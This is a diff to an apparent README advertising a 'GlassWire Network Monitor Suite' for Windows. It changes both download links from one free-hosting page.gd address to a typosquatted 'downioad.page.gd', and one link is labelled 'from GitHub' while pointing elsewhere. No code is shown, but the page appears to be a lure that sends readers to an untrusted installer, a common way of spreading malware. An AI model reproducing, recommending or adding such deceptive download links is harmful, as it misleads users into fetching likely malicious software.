@@ -2,7 +2,7 @@
 
 GlassWire Network Monitor Suite is a powerful desktop application designed for Windows 10 and Windows 11 users who want complete visibility into their network activity. This tool provides real-time monitoring of all incoming and outgoing connections, detailed bandwidth usage statistics, and robust firewall management capabilities. Whether you are a home user concerned about privacy or an IT professional managing multiple endpoints, this suite delivers the insights you need to stay informed and in control.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ---
 
@@ -84,7 +84,7 @@ A: All monitoring data is processed and stored locally on your machine. No infor
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
